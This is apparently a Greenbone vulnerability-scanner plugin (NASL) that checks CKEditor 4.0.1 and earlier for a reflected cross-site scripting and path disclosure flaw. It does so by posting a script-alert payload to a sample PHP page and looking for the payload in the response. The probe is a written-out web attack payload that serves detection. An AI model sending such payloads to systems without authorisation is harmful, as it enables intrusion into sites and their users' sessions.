# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:ckeditor:ckeditor";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903302");
  script_version("2025-03-05T05:38:53+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-02-26 18:00:48 +0530 (Tue, 26 Feb 2013)");
  script_name("CKEditor < 4.0.1.1 Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("sw_ckeditor_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("ckeditor/http/detected");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/24530");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/120387");
  script_xref(name:"URL", value:"http://ckeditor.com/release/CKEditor-4.0.1.1");

  script_tag(name:"summary", value:"CKEditor is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Input passed via POST parameters to
  /ckeditor/samples/sample_posteddata.php is not properly sanitized before being returned to the
  user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in context of an affected site and results in
  loss of confidentiality.");

  script_tag(name:"affected", value:"CKEditor version 4.0.1 is known to be vulnerable. Older
  versions might be affected as well.");

  script_tag(name:"solution", value:"Update to version 4.0.1.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

host = http_host_name( port:port );

url = dir + "/samples/sample_posteddata.php";

postData = "<script>alert('XSS-Test')</script>[]=PATH DISCLOSURE";

req = string( "POST ", url, " HTTP/1.1\r\n",
              "Host: ", host, "\r\n",
              "Content-Type: application/x-www-form-urlencoded\r\n",
              "Content-Length: ", strlen( postData ), "\r\n",
              "\r\n", postData );
res = http_keepalive_send_recv( port:port, data:req);

if( res =~ "^HTTP/1\.[01] 200" && "<script>alert('XSS-Test')</script>" >< res && "ckeditor.com" >< res ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
